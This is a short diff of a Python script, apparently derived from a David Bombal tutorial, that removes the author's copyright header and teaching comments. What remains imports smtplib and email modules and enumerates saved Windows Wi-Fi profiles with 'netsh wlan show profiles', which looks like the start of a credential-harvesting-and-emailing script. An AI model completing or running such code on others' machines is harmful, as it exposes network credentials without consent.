@@ -1,17 +1,8 @@
-#! py
-######################################
-#Copyright of David Bombal, 2021     #
-#https://www.davidbombal.com         #
-#https://www.youtube.com/davidbombal #
-######################################
+
 import subprocess
 import re
 import smtplib
 from email.message import EmailMessage
-
-# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
-# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
-# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
 command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
 
 # We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
